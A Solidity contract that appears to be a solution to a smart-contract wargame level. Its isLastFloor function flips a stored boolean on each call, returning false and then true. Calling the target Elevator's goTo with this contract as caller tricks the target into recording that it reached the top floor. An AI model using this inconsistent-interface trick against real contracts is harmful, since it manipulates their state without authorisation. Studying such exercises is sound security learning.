// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./elevator.sol";

contract ResElevator {
    Elevator public target;
    bool public toggle=true;
    constructor(address _address) public {
        target=Elevator(_address);
    }

    function isLastFloor(uint) public returns (bool){
        toggle=!toggle;
        return toggle;
    }

    function setFloor(uint _flo) public {
        target.goTo(_flo);
    }
}